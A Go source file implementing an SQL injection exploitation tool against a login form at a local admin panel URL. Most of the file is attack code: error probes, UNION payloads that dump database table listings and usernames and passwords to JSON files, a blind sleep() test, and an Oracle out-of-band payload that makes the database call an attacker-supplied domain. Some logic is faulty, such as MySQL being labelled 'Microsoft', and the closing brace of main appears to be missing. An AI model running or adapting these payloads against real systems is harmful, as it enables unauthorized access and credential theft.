package main

import (
		"fmt"
		"time"
		"io/ioutil"
		"os"
		"log"
		"net/http"
		"net/url"
		"strings"
		"regexp"
		"encoding/json"
)

type Userdata struct {
	Id string;
	Username string;
	Password string;
}

func get_response(data url.Values) (int, string) {
	resp, err := http.PostForm("http://localhost:3000/admin/panel_login.php", data);
	if (err != nil) {
		log.Fatal(err);
	}

	body, err := ioutil.ReadAll(resp.Body);
	if (err != nil) {
		log.Fatal(err);
	}

	return resp.StatusCode, string(body);
}

func make_oob_call(data url.Values) bool {
	_, code := get_response(data);
	var result string
	fmt.Printf("Did your oob server receive a connection? : ");
	fmt.Scanln(&result);

	var foobar bool;
	if (result == "Y" && code != "-1") {
		foobar = true;
	} else {
		foobar = false;
	}
	return foobar;
}

func blind_sqli_test() bool {
	mysql_time_delay := func() bool {
		data := url.Values {
			"username":		{"test"},
			"password":		{"test' UNION SELECT 1,2,sleep(5);-- "},
		};
		start := time.Now();
		code, _ := get_response(data);
		elapsed := time.Since(start)
		if (code != -1) { 
			fmt.Printf("(MySQL)Time between request and respone: %s\n", elapsed);
		}
		fmt.Printf("Was the MySQL time delay successful?: ");
		var response string;
		fmt.Scanln(&response);
		if ((response == "Y") || (response == "y")) {
			return true;
		}
		return false;
	}

	oracle_oob := func(domain string) bool {
		var query string = "' UNION SELECT '1','2',extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://" + domain + "\"> %remote;]>'),'/l') FROM dual";
		fmt.Println(query);
		data := url.Values {
			"username":		{""},
			"password":		{query},
		};
		
		var result bool = make_oob_call(data);
		return result;
	}

	fmt.Println("Moving to oob and blind SQLi testing");
	var domain string;
	fmt.Printf("Enter the domain for your oob infrastructure (and ensure it is running): ");
	fmt.Scanln(&domain);
	result := oracle_oob(domain);
	if (result) {
		fmt.Println("*************** ORACLE OOB INTERACTION SUCCESSFUL *****************");
	} else {
		fmt.Printf("\n************************ MOVING ONTO BLIND MySQL TEST *********************\n");
		result = mysql_time_delay();
		if (result) {
			fmt.Printf("\n***************** MySQL TIME DELAY SUCCESSFUL *******************\n");
		}
	}
	return result;
}

func check_sqli() bool {
	data := url.Values {
		"username":		{"''"},
		"password":		{"'"},
	};

	var good bool = false;

	var code int;
	var body string;
	code, body = get_response(data);

	if (code == 500) {
		good = true;
	}

	data = url.Values {
		"username":		{"''"},
		"password":		{"''"},
	};

	code, body = get_response(data);
	if (code == 200) {
		good = true;
	}

	if (good && (body != "")) {
		return true;
	} else {
		return false;
	}
	return false;
}

func get_version() string {
	data := url.Values {
		"username":		{"admin"},
		"password":		{"test' UNION SELECT 1,2,@@version;-- "},
	};
	code, body := get_response(data);
	if (code == 500 || (strings.Contains(body, "Fatal"))) {
		return "Oracle";
	}
	return "Microsoft";
}

func write_data(name string, userdata_obj []Userdata) bool {
	err := ioutil.WriteFile(name, []byte("[\n"), 0644)
	if (err != nil) {
		log.Println(err);
	}
	file, err := os.OpenFile(name, os.O_APPEND|os.O_WRONLY, 0644);
	if (err != nil) {
		log.Println(err);
	}
	var data string;
	for _, val := range userdata_obj {
		defer file.Close();
		data = "{\n\t\"id\":\""+val.Id+"\",\n\t\"username\":\""+val.Username+"\",\n\t\"password\":\""+val.Password+"\"\n},\n";
		if _, err := file.WriteString(data); err != nil {
			log.Fatal(err);
		}
	}
	file.WriteString("]");
	file.Close();
	return true;
}

func parse_data(data string) string {
	re := regexp.MustCompile(`JSONSTART\[.*?\]JSONEND`);
	foo := re.FindString(data);
	reg := regexp.MustCompile(`\[(\{.*?\,?})+\]`);
	bar := reg.FindString(foo);
	final := strings.Replace(bar, "}{", "},{", 10000);
	return string(final);
}

func user_data_enum() {
	data := url.Values {
		"username":		{"admin'OR'1'-'1"},
		"password":		{"test'OR'1'='1'-- "},
	};
	code, body := get_response(data);
	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
		fmt.Println("************************ USER DATA DISCOVERED ***************************\n");
		fmt.Println("************************** ENUMERATING NOW ******************************\n");
		var parsed_data string = parse_data(body);
		var json_data []Userdata;
		json.Unmarshal([]byte(string(parsed_data)), &json_data);
		fmt.Println("USER DATA DISCOVERED:\n");
		for _, val := range json_data {
			fmt.Printf("\tID: %-3s\t|\tUSER: %-18s\t|\tPASSWORD: %-25s\n", val.Id, val.Username, val.Password);
		}
		write_data("userdata.json", json_data);
	}
}

func mysql_database_data_enum() {
	data := url.Values {
		"username":		{"admin'OR'1'='1"},
		"password":		{"test' UNION SELECT table_name,table_schema,table_type FROM information_schema.tables;-- "},
	};
	code, body := get_response(data);
	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
		var parsed_data string = parse_data(body);
		var db_data []Userdata;
		json.Unmarshal([]byte(string(parsed_data)), &db_data);
		fmt.Println("DATABASE DATA DISCOVERED:\n");
		for _, val := range db_data {
			fmt.Printf("\tTABLE NAME: %-50s\t|\tTABLE SCHEMA: %-25s\t|\tTABLE TYPE: %-10s\n", val.Id, val.Username, val.Password);
		}
		write_data("mysql.info", db_data);
	}
}

func oracle_database_data_enum() {
	data := url.Values {
		"username":		{"admin'OR'1'='1"},
		"password":		{"test' UNION SELECT owner, table_name, tablespace_name FROM all_tables-- "},
	};
	code, body := get_response(data);
	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
		var parsed_data string = parse_data(body);
		var db_data []Userdata;
		json.Unmarshal([]byte(string(parsed_data)), &db_data);
		fmt.Println("DATABASE DATA DISCOVERED:\n");
		for _, val := range db_data {
			fmt.Printf("\tTABLE NAME: %-50s\t|\tTABLE SCHEMA: %-25s\t|\tTABLE TYPE: %-10s\n", val.Id, val.Username, val.Password);
		}
		write_data("oracledb.info", db_data);
	}
}

func mysql_enumeration() {
	mysql_database_data_enum();
	user_data_enum();
}

func oracle_enumeration() {
	oracle_database_data_enum();
	user_data_enum();
}

func main() {
	var vuln bool = check_sqli();
	fmt.Println("\n********************* BEGINNING SQLinjection SCAN ***********************\n");
	if (vuln == true) {
		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********\n");
		var _type string = get_version();
		if (_type == "Microsoft") {
			fmt.Println("****************** MICROSOFT MYSQL DATABASE IN USE **********************\n");
			mysql_enumeration()
			fmt.Println("\n********************** LOGGING DISCOVERED DATA **************************\n");
		} else if (_type == "Oracle") {
			fmt.Println("**********************ORACLE SQL DATABASE IN USE*************************\n");
			oracle_enumeration()
			fmt.Println("\n********************** LOGGING DISCOVERED DATA **************************\n");
		} else {
			fmt.Println("*******************UNABLE TO DETERMINE DATABASE TYPE*********************\n");
		}
	} else {
		fmt.Printf("Previous tests failed, move to blind testing?: ");
		var response string;
		fmt.Scanln(&response);
		if ((response == "Y") || (response == "y")) {
			var good bool = blind_sqli_test();
			if (good) {
				fmt.Println("\n*********** BLIND SQLi DISCOVERED, MANUAL TESTER REQUIRED ***********\n");
			}
		} else {
			fmt.Println("\n******************* SQLi NOT DISCOVERED ************************\n");
	}
}
